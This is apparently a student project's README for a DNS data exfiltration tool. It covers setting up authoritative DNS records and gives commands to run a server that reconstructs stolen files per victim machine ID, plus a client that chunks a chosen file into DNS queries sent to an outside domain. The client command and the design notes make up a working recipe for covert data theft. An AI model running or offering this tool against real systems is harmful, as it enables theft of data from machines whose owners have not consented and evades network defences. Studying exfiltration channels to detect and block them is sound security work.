# DNS Data Exfiltration

## Setting Up DNS Records

In order for DNS exfiltration to work, we need to set up our own DNS server that is the authoritative nameserver for some domain.

1. Create an A record pointing to the IP address of the DNS server to exfiltrate data to.
1. Create an NS record pointing to the previously created A record.

   This NS record will be used as the domain for all of our DNS queries.

## Running the DNS Exfiltration Server

DNS requests that reach the DNS exfiltration server are parsed according to the specified format.
Multiple DNS requests are processed and the data inside the files being exfiltrated are reconstructed and written to disk with their original file paths in `./exfiltrated-data/<machine ID>/<file path>`.
This preserves the structure of the files when exfiltrating directories of files.

Example of running the DNS exfiltration server:
```sh
make compile
sudo ./dns-exfiltration-server -n cs5231.ianyong.com
```

Note that root privileges are required to bind to port 53 as it is as well-known port for DNS.
Once the server has binded to the port, it will drop its privileges to that of the calling user.

In addition, the domain that the name server is listening on (`cs5231.ianyong.com` in the example above) must also be passed in as a command line argument.
This is necessary for the server to know which parts of the DNS request name correspond to the data being exfiltrated.

## Running the DNS Exfiltration Client

The client takes in a file path, reads the file, and breaks its content up into chunks to exfiltrate over DNS.

Example of running the DNS exfiltration client:
```sh
make compile
./dns-exfiltration-client -n cs5231.ianyong.com -f exfiltrate-this.txt
```

Similar to the DNS exfiltration server, the domain that the name server is listening on (`cs5231.ianyong.com` in the example above) must be passed in as a command line argument.
The client also takes in the path of the file to be exfiltrated.

## Design Decisions

### Identifying Targets

Targets cannot be identified via the IP address seen by the server.
This is because our DNS server will not be the local DNS server that the target talk to.
As such, regardless of the DNS query type (iterative or recursive), our DNS server never talks directly to the target.

In addition, some local DNS servers have a range of IP addresses which they use to communicate to other DNS servers.
Given the connectionless nature of UDP (the transport protocol used by DNS), every DNS request that we receive from the same target can come from different IP addresses.

In order to be able to handle simultaneous traffic from multiple hosts, as well as to uniquely identify targets which we exfiltrate data from, we make use of the machine ID of the target machine.
The machine ID is a unique string that is set during installation of the operating system.
We make use of the [machineid](https://github.com/denisbrodbeck/machineid) library to retrieve the machine ID from the target.

## Limitations

### DNS Caching

The DNS responses sent by the server have a Time-To-Live (TTL) of 300 seconds.
This is because setting it any lower might result in some DNS resolvers to ignore its value.
As a result, trying to exfiltrate the same file will not work until some time has passed (likely 5 minutes if the TTL is respected, possibly longer).
This is not a big issue as long as the exfiltration does not fail halfway through as we are unlikely to need to exfiltrate a recently exfiltrated file.
